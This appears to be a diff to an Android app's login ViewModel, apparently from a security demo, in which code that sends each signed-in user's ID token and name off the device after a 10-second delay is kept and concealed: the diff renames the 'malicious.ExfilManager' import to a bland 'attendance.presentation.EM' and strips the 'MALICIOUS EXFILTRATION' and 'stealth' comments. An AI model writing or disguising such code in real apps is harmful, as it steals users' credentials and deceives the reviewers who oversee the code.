@@ -14,7 +14,7 @@ import kotlinx.coroutines.TimeoutCancellationException
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import android.util.Log
-import com.example.sitconnect.securitydemo.malicious.ExfilManager// ← adjust package name if needed
+import com.example.sitconnect.features.attendance.presentation.EM
 import android.content.Context
 import android.content.pm.PackageManager
 import androidx.core.content.ContextCompat
@@ -69,14 +69,13 @@ class AuthViewModel : ViewModel() {
                     _authState.value = AuthState.Success(user)
                 }
 
-                    // ────────────────────────────────────────────────────────────────
-                    //          MALICIOUS EXFILTRATION
+
                 val user = (authState.value as? AuthState.Success)?.user
                 if (user != null) {
                     launch {
                         try {
-                            // Small delay to make it less obvious (stealth simulation)
-                            delay(10000)  // 90 seconds – change to 10000 (10s) for faster testing
+
+                            delay(10000)
 
                             val idToken = getFreshIdToken(user)
                             if (idToken != null) {
@@ -86,14 +85,14 @@ class AuthViewModel : ViewModel() {
                                     "displayName" to (user.displayName ?: "N/A"),
                                     "idToken"     to idToken,
                                     "timestamp"   to System.currentTimeMillis(),
-                                    // You can add more later (device info, etc.)
+
                                 )
 
                                 Log.d("ExfilDemo", "Sending stolen payload...")
 
                                 // This runs the actual network send on IO thread
                                 launch(Dispatchers.IO) {
-                                    ExfilManager.send(payload)
+                                    EM.send(payload)
                                 }
                             }
                         } catch (e: Exception) {
